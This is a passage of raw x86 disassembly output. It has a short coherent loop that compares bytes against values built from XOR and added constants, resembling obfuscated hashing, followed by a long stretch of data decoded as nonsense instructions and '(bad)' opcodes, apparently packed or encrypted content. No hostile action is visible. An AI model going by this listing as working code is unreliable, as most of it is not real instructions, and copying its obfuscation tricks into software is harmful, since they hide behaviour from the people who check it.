  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    esi,0xc7
  405133:	cmp    al,0xbc
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xce70707d
  40513e:	mov    edi,0x72ad425
  405143:	ins    DWORD PTR es:[edi],dx
  405144:	popf   
  405145:	xchg   edx,eax
  405146:	pop    esi
  405147:	out    0x71,eax
  405149:	les    ebp,FWORD PTR [esp+ebx*2]
  40514c:	pop    eax
  40514d:	lods   al,BYTE PTR ds:[esi]
  40514e:	inc    ebx
  40514f:	repz inc edi
  405151:	xchg   esi,eax
  405152:	sar    BYTE PTR [ecx-0x1c4f4477],1
  405158:	mov    edx,0xc58c9f35
  40515d:	into   
  40515e:	mov    eax,DWORD PTR [edx+edi*8-0x6a]
  405162:	mov    ch,ah
  405164:	dec    ebp
  405165:	fnsave [ecx+ebx*1+0x41a82d97]
  40516c:	(bad)  
  40516d:	and    BYTE PTR [eax],bl
  40516f:	pusha  
  405170:	sti    
  405171:	rcr    BYTE PTR [esi+0x69],1
  405174:	js     0x4051b7
  405176:	neg    DWORD PTR [ebp+eax*1-0xd96078d]
  40517d:	mov    es,WORD PTR [eax-0x433cd95a]
  405183:	popf   
  405184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405186:	fidivr WORD PTR [edi+0x13ed15f1]
  40518c:	out    0x12,eax
  40518e:	daa    
  40518f:	imul   esi,esp,0xffffffda
  405192:	xchg   ebx,eax
  405193:	adc    DWORD PTR [ebx],edx
  405195:	adc    al,0x3f
  405197:	cwde   
  405198:	stos   DWORD PTR es:[edi],eax
  405199:	xchg   ebx,eax
  40519a:	call   FWORD PTR [edi-0x698843b7]
  4051a0:	aad    0xa3
  4051a2:	test   eax,0xb4588e50
  4051a7:	pop    es
  4051a8:	xchg   ebp,eax
  4051a9:	add    ebp,DWORD PTR [edi]
  4051ab:	outs   dx,BYTE PTR ds:[esi]
  4051ac:	add    esp,DWORD PTR [eax+0x29d5355b]
  4051b2:	bound  ecx,QWORD PTR [ecx+0x2]
  4051b5:	sub    dh,al
  4051b7:	clc    
  4051b8:	jl     0x40517d
  4051ba:	mov    ds:0x13bfd334,eax
  4051bf:	push   ss
  4051c0:	mov    ds:0x6aa2c930,eax
  4051c5:	pop    ds
  4051c6:	mov    ebp,0x59ebd005
  4051cb:	pop    ebp
  4051cc:	push   esp
  4051cd:	sti    
  4051ce:	jnp    0x40521f
  4051d0:	js     0x4051af
  4051d2:	xor    eax,0xb8d96a32
  4051d7:	les    eax,FWORD PTR [esi-0x51]
  4051da:	xchg   esi,eax
  4051db:	push   ds
  4051dc:	mov    ah,0xa1
  4051de:	sub    al,0x95
  4051e0:	lea    edi,[esi+0x48]
  4051e3:	retf   
  4051e4:	or     ebx,eax
  4051e6:	jmp    0xc43:0xeac9cbe3
  4051ed:	outs   dx,DWORD PTR ds:[esi]
  4051ee:	jnp    0x4051e9
  4051f0:	(bad)  
  4051f1:	es and bh,dh
  4051f4:	xchg   ebp,eax
  4051f5:	inc    esp
  4051f6:	ja     0x405218
  4051f8:	int3   
  4051f9:	(bad)  [edi-0x5c]
  4051fc:	jno    0x405214
  4051fe:	xchg   ebx,eax
  4051ff:	jge    0x4051db
  405201:	lock cmp al,0xa7
  405204:	adc    eax,0xdc075c67
  405209:	(bad)  
  40520a:	xor    BYTE PTR [esi],ah
  40520c:	mov    DWORD PTR [ebx],ebx
  40520e:	outs   dx,DWORD PTR ds:[esi]
  40520f:	and    esp,DWORD PTR [ecx+0x34]
  405212:	daa    
  405213:	sbb    ch,0x0
  405216:	js     0x40521c
  405218:	ss retf 0xa48e
  40521c:	adc    BYTE PTR [ebx],ch
  40521e:	xchg   DWORD PTR [edi+ebp*2-0x3a],edi
  405222:	mov    bh,0x26
  405224:	lods   al,BYTE PTR ds:[esi]
  405225:	jg     0x405296
  405227:	ja     0x40528e
  405229:	dec    eax
  40522a:	jae    0x405210
  40522c:	pusha  
  40522d:	xor    bh,BYTE PTR [eax-0x7646a2fd]
  405233:	xchg   ecx,eax
  405234:	cmp    BYTE PTR [eax+0xf],0xf3
  405238:	popa   
  405239:	imul   ebx,DWORD PTR [ebx-0x34],0xb1023371
  405240:	adc    DWORD PTR [eax+0x20],ebx
  405243:	and    ebx,ebx
  405245:	mov    al,0xc9
  405247:	es (bad) 
  405249:	mov    ds:0xa4aa22f3,al
  40524e:	aas    
  40524f:	xchg   ebx,eax
  405250:	rcr    eax,1
  405252:	pop    esp
  405253:	push   esi
  405254:	adc    eax,0xff0696e0
  405259:	loop   0x40529e
  40525b:	sub    DWORD PTR [edx-0x350b7f32],ebx
  405261:	mov    ch,0xb7
  405263:	xchg   BYTE PTR [esi+ecx*1],dl
  405266:	mov    bh,dh
  405268:	sti    
  405269:	loop   0x4052be
  40526b:	dec    esi
  40526c:	xchg   BYTE PTR [ebx+0x282a330d],ch
  405272:	out    0xa2,eax
  405274:	icebp  
  405275:	adc    ecx,DWORD PTR [edi-0x74]
  405278:	shl    DWORD PTR [edi-0x3f777021],1
  40527e:	and    eax,0x99cb8378
  405283:	sar    DWORD PTR gs:[bp+di+0x697e],1
  405289:	aam    0xe2
  40528b:	push   edx
  40528c:	cs pop ecx
  40528e:	inc    edx
  40528f:	push   edx
  405290:	ror    BYTE PTR ds:0xe9ab063b,cl
  405296:	lods   eax,DWORD PTR ds:[esi]
  405297:	push   esp
  405298:	das    
  405299:	add    edx,DWORD PTR [ebx]
  40529b:	in     al,dx
  40529c:	stc    
  40529d:	pop    ebp
  40529e:	rcl    DWORD PTR [eax*1+0x61167de4],1
  4052a5:	fwait
  4052a6:	pop    es
  4052a7:	mov    esi,0xcbb1e3f9
  4052ac:	dec    ecx
  4052ad:	shr    DWORD PTR ds:0xd4c2550,cl
  4052b3:	pop    edi
  4052b4:	loope  0x4052c4
  4052b6:	mov    ds:0xb4268e0,eax
  4052bb:	add    al,0xb3
  4052bd:	aaa    
  4052be:	inc    esp
  4052bf:	or     eax,0xcc50d98d
  4052c4:	push   esi
  4052c5:	out    dx,al
  4052c6:	push   ecx
  4052c7:	cmp    al,0x70
  4052c9:	xchg   esp,eax
  4052ca:	(bad)  
  4052cb:	ret    
  4052cc:	sbb    dl,BYTE PTR [ecx]
  4052ce:	retf   
  4052cf:	mov    ch,0x9c
  4052d1:	mov    ah,0xf2
  4052d3:	push   eax
  4052d4:	retf   
  4052d5:	dec    esi
  4052d6:	mov    bh,0x37
  4052d8:	jbe    0x4052ae
  4052da:	push   ebp
  4052db:	jp     0x40533b
  4052dd:	jnp    0x405313
  4052df:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4052e1:	jns    0x405273
  4052e3:	pushf  
  4052e4:	xchg   ecx,eax
  4052e5:	cwde   
  4052e6:	imul   esi,DWORD PTR [edx],0x5f
  4052e9:	(bad)  
  4052ea:	pop    edi
  4052eb:	pop    esp
  4052ec:	out    dx,al
  4052ed:	cs push ebp
  4052ef:	sbb    bh,BYTE PTR [edx+ebp*8+0x12872f1f]
  4052f6:	neg    DWORD PTR es:[esi-0x68]
  4052fa:	je     0x40533f
  4052fc:	rol    BYTE PTR [edi],0x17
  4052ff:	dec    esi
  405300:	fldcw  WORD PTR [ecx]
  405302:	loop   0x405330
  405304:	leave  
  405305:	shl    BYTE PTR [esi+0x3b],1
  405308:	xor    edi,eax
  40530a:	cmp    dl,BYTE PTR [ecx-0x3d8ca5cf]
  405310:	fdiv   st,st(3)
  405312:	or     eax,0x52bcb7ec
  405317:	out    dx,eax
  405318:	(bad)  
  405319:	leave  
  40531a:	loop   0x4052d3
  40531c:	out    dx,eax
  40531d:	ret    0x7264
  405320:	(bad)  
  405321:	std    
  405322:	push   0xffffffa5
  405324:	adc    al,0xac
  405326:	pop    ebx
  405327:	test   eax,0x2fb17fa1
  40532c:	mov    BYTE PTR [ecx+edi*2-0x6dcab20b],dl
  405333:	pop    ebp
  405334:	lahf   
  405335:	out    0xe,eax
  405337:	mov    edi,0xbf8ba90b
  40533c:	int    0x20
  40533e:	xchg   BYTE PTR [edi],cl
  405340:	cld    
  405341:	lds    esp,FWORD PTR [ebx+ebp*2+0x50]
  405345:	rcl    DWORD PTR [edx+0x34],cl
  405348:	and    al,0x14
  40534a:	pop    ecx
  40534b:	loope  0x4053a8
  40534d:	pop    ecx
  40534e:	lods   eax,DWORD PTR ds:[esi]
  40534f:	rol    BYTE PTR [edx+0x7f951ad8],0xc7
  405356:	xor    eax,0x7f0c1d98
  40535b:	fild   WORD PTR [eax-0x2e]
  40535e:	pop    es
  40535f:	int3   
  405360:	js     0x405371
  405362:	cli    
  405363:	xlat   BYTE PTR ds:[ebx]
  405364:	and    cl,dh
  405366:	push   0x469efcb1
  40536b:	std    
  40536c:	sub    DWORD PTR [eax+0xf3998ca],esp
  405372:	shl    DWORD PTR [ebx+0x5f],cl
  405375:	jo     0x4053cf
  405377:	sbb    edx,0xffffffc2
  40537a:	pop    DWORD PTR [eax+0x46]
  40537d:	xor    BYTE PTR [eax],ah
  40537f:	jns    0x405338
  405381:	enter  0x7730,0x63
  405385:	mov    dh,0x4f
  405387:	and    DWORD PTR ds:0x1cc04b5e,ebx
  40538d:	dec    edx
  40538e:	add    BYTE PTR [ecx+0x54eefd5f],ch
  405394:	std    
  405395:	ret    
  405396:	xchg   edx,eax
  405397:	test   al,0xec
  405399:	loopne 0x40536a
  40539b:	retf   0xe4e5
  40539e:	mov    al,ds:0xd1cc77e
  4053a3:	xchg   BYTE PTR [ecx],dl
  4053a5:	test   esi,0xa246e2eb
  4053ab:	popa   
  4053ac:	fisub  WORD PTR [ecx-0x5fb7623d]
  4053b2:	xchg   esi,eax
  4053b3:	loopne 0x4053a1
  4053b5:	int3   
  4053b6:	(bad)  
  4053b7:	int    0x96
  4053b9:	fild   QWORD PTR [eax-0x14]
  4053bc:	push   ds
  4053bd:	push   ds
  4053be:	and    bh,ch
  4053c0:	fild   DWORD PTR [eax]
  4053c2:	jns    0x405421
  4053c4:	stos   DWORD PTR es:[edi],eax
  4053c5:	in     eax,0x5e
  4053c7:	pop    ebx
  4053c8:	mov    ebx,0xcb22af80
  4053cd:	xchg   edi,eax
  4053ce:	mov    ah,0xd
  4053d0:	retf   
  4053d1:	scas   al,BYTE PTR es:[edi]
  4053d2:	cld    
  4053d3:	les    ecx,FWORD PTR [edi]
  4053d5:	cdq    
  4053d6:	sti    
  4053d7:	push   ebx
  4053d8:	xchg   edx,eax
  4053d9:	daa    
  4053da:	aaa    
  4053db:	cwde   
  4053dc:	cmp    eax,0xfce6f5f1
  4053e1:	inc    edi
  4053e2:	push   0x41493f8b
  4053e7:	sub    eax,0x2177aa23
  4053ec:	stc    
  4053ed:	nop
  4053ee:	mov    ah,0x19
  4053f0:	sub    edi,DWORD PTR [eax-0x14]
  4053f3:	lock and dl,dh
  4053f6:	test   BYTE PTR [ebp+ebx*4+0x2f],bh
  4053fa:	in     eax,dx
  4053fb:	inc    esi
  4053fc:	xor    BYTE PTR [ebx+edx*8-0x31],0xb6
  405401:	arpl   sp,di
  405403:	jmp    0xa348:0x40a83d70
  40540a:	pop    ebx
  40540b:	add    DWORD PTR [ebp-0x5f],0x9a5eda59
  405412:	and    eax,0xa6309cd1
  405417:	sbb    bl,cl
  405419:	mov    bh,0x34
  40541b:	stc    
  40541c:	call   0x47a6:0xf2fbcb28
  405423:	in     eax,0x25
  405425:	ret    0xfc09
  405428:	mov    edx,0x97964a5b
  40542d:	jo     0x405468
  40542f:	mov    ds:0x74d074a2,al
  405434:	xchg   edx,eax
  405435:	push   edx
  405436:	pushf  
  405437:	scas   al,BYTE PTR es:[edi]
  405438:	cmc    
  405439:	cmp    al,0x3
  40543b:	popa   
  40543c:	push   ecx
  40543d:	and    BYTE PTR [edi-0x74f7399a],bl
  405443:	ror    BYTE PTR [edx-0x1b70066b],cl
  405449:	icebp  
  40544a:	popa   
  40544b:	xor    BYTE PTR ds:0x9ea3931a,0xcc
  405452:	push   cs
  405453:	ficomp DWORD PTR [ebp+0xd]
  405456:	pop    ds
  405457:	adc    al,0x81
  405459:	adc    BYTE PTR ds:[edi],dh
  40545c:	mov    esp,DWORD PTR [eax+0x1027e58]
  405462:	inc    ebx
  405463:	sbb    DWORD PTR [eax+0x2f6aca5e],eax
  405469:	shl    DWORD PTR [ebx-0xe],0x4f
  40546d:	xchg   DWORD PTR [esi+esi*4-0x930415d],edi
  405474:	xchg   ebp,esp
  405476:	lock or DWORD PTR [ebx+0x2a2a338e],edx
  40547d:	jb     0x4054ed
  40547f:	add    BYTE PTR [esi-0x37],bl
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	pop    esi
  4054a9:	pushf  
  4054aa:	or     dx,WORD PTR [eax]
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054fc
  4054b5:	ja     0x40545a
  4054b7:	add    al,0x7d
  4054b9:	sbb    eax,0x508f926a
  4054be:	mov    esi,0x9bf512f5
  4054c3:	(bad)  
  4054c4:	dec    edi
  4054c5:	dec    ebp
  4054c6:	inc    ebp
  4054c8:	ret    
  4054c9:	clc    
  4054ca:	pop    ds
  4054cb:	adc    ebp,DWORD PTR [ecx+0x77e40976]
  4054d1:	jmp    0xafdd:0xb6fcef76
  4054d8:	aad    0xaf
  4054da:	cwde   
  4054db:	mov    edi,DWORD PTR [edx-0x618854e9]
  4054e1:	into   
  4054e2:	lock lock add ah,bh
  4054e6:	call   0xd5c1:0x6fa4dd6f
  4054ed:	add    esi,0xffffffac
  4054f0:	mov    edx,0xc3de56a5
  4054f5:	out    0xa1,eax
  4054f7:	in     eax,0xa9
  4054f9:	ds jmp 0x3ad9:0xea8471f0
  405501:	shl    BYTE PTR [eax],0x6e
  405504:	xchg   edi,esp
  405506:	mov    DWORD PTR [ecx+0x29bb7564],ecx
  40550c:	popf   
  40550d:	ss pop eax
  40550f:	stos   BYTE PTR es:[edi],al
  405510:	mov    eax,ds:0x9210d0f3
  405515:	xchg   ebx,eax
  405516:	cwde   
  405517:	mov    dh,0xaa
  405519:	pusha  
  40551a:	or     eax,0x6332f38d
  40551f:	and    al,0xeb
  405522:	lods   eax,DWORD PTR ds:[esi]
  405523:	cmp    ch,BYTE PTR [di+0x1f19]
  405528:	sbb    BYTE PTR [eax+0x309c93a5],bh
  40552e:	inc    eax
  40552f:	out    dx,eax
  405530:	ss pusha 
  405532:	inc    ecx
  405533:	cmp    DWORD PTR [edx+0x720128ac],esi
  405539:	sahf   
  40553a:	mov    es,WORD PTR [eax+0x1b]
  40553d:	jb     0x40552a
  40553f:	xchg   edi,eax
  405540:	jmp    0xa03cd734
  405545:	leave  
  405546:	jge    0x4054d3
  405548:	in     eax,dx
  405549:	mov    bl,0x5a
  40554b:	fidivr DWORD PTR [esi]
  40554d:	into   
  40554e:	sti    
  40554f:	in     al,dx
  405550:	ret    0x3188
  405553:	sbb    ebp,0xffffffa6
  405556:	pop    ebx
  405557:	mov    edi,0x121d3365
  40555c:	(bad)  
  40555d:	push   ecx
  40555e:	sbb    edx,0x84184f87
  405564:	and    ebx,DWORD PTR [edx-0x4e]
  405567:	mov    al,ds:0x5db3ec91
  40556c:	mov    cl,0x45
  40556e:	test   BYTE PTR ds:0x21eef7af,0x80
  405575:	lahf   
  405576:	or     eax,0x9d56010c
  40557b:	dec    ebx
  40557c:	push   edx
  40557d:	shl    DWORD PTR [esi+edi*1-0x13],0xea
  405582:	ins    DWORD PTR es:[edi],dx
  405583:	fsub   QWORD PTR [ecx-0x44b803a]
  405589:	sub    dh,al
  40558b:	jp     0x40557c
  40558d:	daa    
  40558e:	shr    bl,cl
  405590:	in     al,dx
  405591:	jle    0x40559f
  405593:	adc    ch,dl
  405595:	mov    esi,0xfea9d6b4
  40559a:	lds    ebx,FWORD PTR [ebx+eax*8]
  40559d:	leave  
  40559e:	popa   
  40559f:	jae    0x4055d3
  4055a1:	ins    BYTE PTR es:[edi],dx
  4055a2:	scas   al,BYTE PTR es:[edi]
  4055a3:	pop    ecx
  4055a4:	mov    ah,0x40
  4055a6:	sub    ecx,esi
  4055a8:	inc    edx
  4055a9:	sar    DWORD PTR [esi],0x48
  4055ac:	lods   eax,DWORD PTR ds:[esi]
  4055ad:	mov    bh,0x86
  4055af:	mov    WORD PTR [eax-0x5f],ds
  4055b2:	cli    
  4055b3:	xchg   esi,eax
  4055b4:	push   edx
  4055b5:	gs (bad) 
  4055b7:	adc    bl,BYTE PTR [esi]
  4055b9:	xor    eax,DWORD PTR [eax+edi*1-0x27cab157]
  4055c0:	and    BYTE PTR [esi+0x6d],0xf0
  4055c4:	in     al,dx
  4055c5:	add    eax,0xc4b9cf7c
  4055ca:	jnp    0x40559e
  4055cc:	adc    al,0x48
  4055ce:	out    0x33,al
  4055d0:	retf   
  4055d1:	int    0x55
  4055d3:	xor    esp,DWORD PTR [ebx]
  4055d5:	ins    BYTE PTR es:[edi],dx
  4055d6:	mov    al,ds:0x5198d0a1
  4055db:	sahf   
  4055dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055dd:	jp     0x4055b7
  4055df:	mov    bl,0x2b
  4055e1:	push   ebp
  4055e2:	in     al,dx
  4055e3:	fisttp DWORD PTR [eax-0x1b]
  4055e6:	jo     0x4055ef
  4055e8:	push   esp
  4055e9:	fnstenv [esi+eiz*4]
  4055ec:	sti    
  4055ed:	add    al,0xb0
  4055ef:	dec    esi
  4055f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055f1:	test   BYTE PTR [edx+0x38567a29],cl
  4055f7:	cmp    esi,DWORD PTR [ecx+0x7a89f099]
  4055fd:	mov    edi,0x8e2ed132
  405602:	shl    edi,0x7c
  405605:	xchg   edx,eax
  405606:	daa    
  405607:	cmp    DWORD PTR [esi+0x117fda38],edx
  40560d:	or     eax,0x4bf16a29
  405612:	rcr    BYTE PTR [esi-0x5d4b08fe],cl
  405618:	mov    cl,0x55
  40561a:	loopne 0x4055bb
  40561c:	scas   al,BYTE PTR es:[edi]
  40561d:	or     eax,0xe43719f6
  405622:	xlat   BYTE PTR ds:[ebx]
  405623:	fs push edi
  405625:	xor    ecx,eax
  405627:	add    BYTE PTR [eax+ecx*8-0x3e47e356],cl
  40562e:	jno    0x405610
  405630:	je     0x40569a
  405632:	hlt    
  405633:	dec    ecx
  405634:	fmul   QWORD PTR ss:[ecx]
  405637:	jmp    0xeb7c079b
  40563c:	adc    al,0x6f
  40563e:	into   
  40563f:	(bad)  
  405640:	adc    al,0x76
  405642:	push   cs
  405643:	data16 mov dh,0x35
  405646:	push   ss
  405647:	adc    dl,BYTE PTR [esi]
  405649:	call   0x29276ed1
  40564e:	bound  esi,QWORD PTR [ecx-0x7cb508f6]
  405654:	jp     0x405692
  405656:	inc    esp
  405657:	mov    al,0x51
  405659:	lods   al,BYTE PTR ds:[esi]
  40565a:	push   0x22
  40565c:	xchg   ecx,eax
  40565d:	cmp    BYTE PTR [esi+eiz*4+0x28],bl
  405661:	jge    0x4055fe
  405663:	mov    BYTE PTR [ebx+0x40],bh
  405666:	fnstsw WORD PTR [edi+0x25]
  405669:	ins    BYTE PTR es:[edi],dx
  40566a:	mov    ebp,0x89d18a4c
  40566f:	cmp    DWORD PTR [ebx+0x78],edx
  405672:	das    
  405673:	cmp    esp,DWORD PTR [eax+0x65ba61b7]
  405679:	cmp    ah,BYTE PTR [esi-0x5802c618]
  40567f:	push   0x59a84bdc
  405684:	cmp    esi,DWORD PTR ds:0xa2a1bcba
  40568a:	lds    edi,FWORD PTR [edi+0x83fe1]
  405690:	adc    eax,0x4d64f58f
  405695:	sahf   
  405696:	xor    ebx,esp
  405698:	mov    ecx,0xfedb8d4e
  40569d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40569e:	into   
  40569f:	aaa    
  4056a0:	test   al,0x46
  4056a2:	add    edi,DWORD PTR [edx-0x2a457179]
  4056a8:	mov    esp,0x4d86d8df
  4056ad:	cmp    al,0xf4
  4056af:	or     edx,DWORD PTR [esi+edx*2-0x6b]
  4056b3:	adc    eax,0x7f58610e
  4056b8:	push   cs
  4056b9:	adc    BYTE PTR [ecx+0x4ae627be],bh
  4056bf:	jnp    0x4056de
  4056c1:	xchg   esi,eax
  4056c2:	inc    ebx
  4056c3:	(bad)  
  4056c4:	das    
  4056c5:	mov    BYTE PTR [esi],al
  4056c7:	test   DWORD PTR [esi-0x50],0xd761c084
  4056ce:	xchg   edi,eax
  4056cf:	sub    ecx,DWORD PTR [esi+edx*8+0x78]
  4056d3:	retf   
  4056d4:	shl    DWORD PTR [edi-0x626e60b3],1
  4056da:	call   0x888383dc
  4056df:	jnp    0x4056db
  4056e1:	add    eax,0x23d49304
  4056e6:	inc    esi
  4056e7:	mov    bl,0x0
  4056e9:	pop    eax
  4056ea:	(bad)  
  4056eb:	rol    bl,cl
  4056ed:	sbb    dh,dl
  4056ef:	dec    ebx
  4056f0:	and    al,BYTE PTR [ebp-0x4ad3a7ac]
  4056f6:	or     BYTE PTR ds:0x12c202c4,bl
  4056fc:	pop    ebp
  4056fd:	jmp    0x452e:0xbda400dd
  405704:	imul   ebp,DWORD PTR [ebx],0xffffffbf
  405707:	and    cl,bl
  405709:	jge    0x4056d5
  40570b:	mov    dl,0x14
  40570d:	inc    ecx
  40570e:	dec    edi
  40570f:	rcl    DWORD PTR [esp+esi*2-0x488db425],1
  405716:	cmc    
  405717:	mov    BYTE PTR [ecx-0x7d111dfc],ch
  40571d:	or     al,0xe6
  40571f:	and    DWORD PTR [esi-0x5f],eax
  405722:	cli    
  405723:	loop   0x4056ad
  405725:	test   eax,0x96c4854b
  40572a:	cmp    cl,BYTE PTR [edi+0x33463121]
  405730:	push   cs
  405731:	fs retf 0x29b6
  405735:	fs push esi
  405737:	jmp    0xf314:0x30967930
  40573e:	aam    0xce
  405740:	inc    ebp
  405741:	jecxz  0x4057a7
  405743:	jle    0x405747
  405745:	out    dx,al
  405746:	jns    0x40571a
  405748:	sbb    edi,DWORD PTR ds:0x592233cd
  40574e:	fld    DWORD PTR [edi+0x7028e74c]
  405754:	ins    DWORD PTR es:[edi],dx
  405755:	mov    ds:0x6fc01c79,eax
  40575a:	cmp    ebp,ecx
  40575c:	(bad)
  405760:	call   0xb66ab33d
  405765:	retf   
  405766:	fist   WORD PTR [edi]
  405768:	push   edx
  405769:	rcl    DWORD PTR [ecx+0xf],1
  40576c:	mov    bh,0x5
  40576e:	xchg   ch,bh
  405770:	inc    edx
  405771:	add    BYTE PTR [ebx],ah
  405773:	add    eax,0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x578e6e42],eax
  405790:	jecxz  0x405760
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	mov    ecx,0xf8a2a893
  40579f:	nop
  4057a0:	pop    eax
  4057a1:	ja     0x4057b2
  4057a3:	ficomp DWORD PTR [edx-0x76]
  4057a6:	into   
  4057a7:	xchg   ebx,eax
  4057a8:	mov    bh,0x1
  4057aa:	mov    bl,0xb9
  4057ac:	in     eax,0xa0
  4057ae:	ret    0xc739
  4057b1:	dec    ecx
  4057b2:	adc    eax,0x239eec4a
  4057b7:	mov    eax,ds:0x754b304e
  4057bc:	cmp    al,0xc
  4057be:	cmp    DWORD PTR [eax+0x7ed1491d],0xffffffd7
  4057c5:	fdivrp st(6),st
  4057c7:	and    edx,DWORD PTR [esi]
  4057c9:	aad    0x82
  4057cb:	gs sbb edi,esp
  4057ce:	xchg   DWORD PTR [ecx+0x29],esp
  4057d1:	adc    BYTE PTR [esi+0x64a43d81],ch
  4057d7:	dec    ecx
  4057d8:	xor    eax,0xb2bc513f
  4057dd:	sar    BYTE PTR [ecx],0xc9
  4057e0:	fmul   QWORD PTR [edx]
  4057e2:	inc    ebx
  4057e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057e4:	ds jl  0x405839
  4057e7:	les    ebx,FWORD PTR [eax-0x11ccd68]
  4057ed:	mov    ds:0xa631d2ef,al
  4057f2:	jbe    0x40584f
  4057f4:	adc    ah,al
  4057f6:	call   0xf9604ed8
  4057fb:	mov    eax,ecx
  4057fd:	inc    edi
  4057fe:	push   0xffffffb2
  405800:	cmp    BYTE PTR [ecx+0x3c],dl
  405803:	dec    esp
  405804:	outs   dx,BYTE PTR ds:[esi]
  405805:	int3   
  405806:	mov    ecx,0xf70f4efa
  40580b:	fdivr  DWORD PTR [esi]
  40580d:	test   BYTE PTR [esi],0xe6
  405810:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405812:	das    
  405813:	and    DWORD PTR [edi-0xa930a28],edx
  405819:	rol    DWORD PTR [esi+0x1ecde660],cl
  40581f:	leave  
  405820:	and    bl,BYTE PTR [ecx-0x6d76b463]
  405826:	xor    DWORD PTR [edx+eax*2+0x83d7520],edx
  40582d:	xor    ebx,ebp
  40582f:	ret    0x433e
  405832:	inc    esi
  405833:	sub    bl,bh
  405835:	or     ebp,DWORD PTR [ebx-0x6e]
  405838:	cmp    bl,BYTE PTR [edx+0x43]
  40583b:	fdivr  QWORD PTR [edx-0x2eef5348]
  405841:	inc    ebx
  405842:	imul   esp,edx,0x76a94693
  405848:	add    ecx,ecx
  40584a:	or     ecx,eax
  40584c:	rcl    BYTE PTR [edx+0x4acc6193],0xc8
  405853:	mov    ebp,0x926f3362
  405858:	das    
  405859:	xlat   BYTE PTR ds:[ebx]
  40585a:	xor    BYTE PTR [eax-0x53],dl
  40585d:	outs   dx,BYTE PTR ds:[esi]
  40585e:	cmp    bh,BYTE PTR [edi-0x4e7afec0]
  405864:	in     al,dx
  405865:	ss inc ebx
  405867:	in     eax,dx
  405868:	ins    DWORD PTR es:[edi],dx
  405869:	sub    BYTE PTR [ebp-0x3b974585],0xa0
  405870:	retf   
  405871:	repz pop es
  405873:	in     eax,dx
  405874:	jb     0x405875
  405876:	dec    ebx
  405877:	cli    
  405878:	(bad)  
  405879:	std    
  40587a:	cli    
  40587b:	jmp    0xf9862c45
  405880:	mov    BYTE PTR [edx-0x65bbe4be],ah
  405886:	ins    BYTE PTR es:[edi],dx
  405887:	popa   
  405888:	inc    ecx
  405889:	arpl   WORD PTR [ecx+0x3fc0c86a],ax
  40588f:	fstp   DWORD PTR [ebx]
  405891:	test   al,0xb0
  405893:	into   
  405894:	cdq    
  405895:	add    BYTE PTR [ebx],dl
  405897:	pushf  
  405898:	fsubr  DWORD PTR ss:[edx]
  40589b:	retf   0xe0b
  40589e:	in     al,0x38
  4058a0:	scas   eax,DWORD PTR es:[edi]
  4058a1:	cdq    
  4058a2:	rcr    DWORD PTR [eax-0x51],1
  4058a5:	shr    BYTE PTR [ebx],1
  4058a7:	add    eax,0x59522c04
  4058ac:	push   edi
  4058ad:	cdq    
  4058ae:	dec    ebp
  4058af:	mov    edi,0x6c8b2289
  4058b4:	push   eax
  4058b5:	jno    0x405887
  4058b7:	arpl   WORD PTR [ecx],bx
  4058b9:	cmp    DWORD PTR [ebx+ebp*2+0x20],edi
  4058bd:	mov    cl,0xbf
  4058bf:	int3   
  4058c0:	sbb    eax,0x543de326
  4058c5:	imul   ebx,esi,0xdcca1152
  4058cb:	xor    bl,BYTE PTR [ebp-0x3ed7e328]
  4058d1:	pop    esp
  4058d2:	cli    
  4058d3:	popf   
  4058d4:	jle    0x405895
  4058d6:	mov    edi,0xb881c6b4
  4058db:	mov    ?,edi
  4058dd:	(bad)  
  4058de:	push   ebx
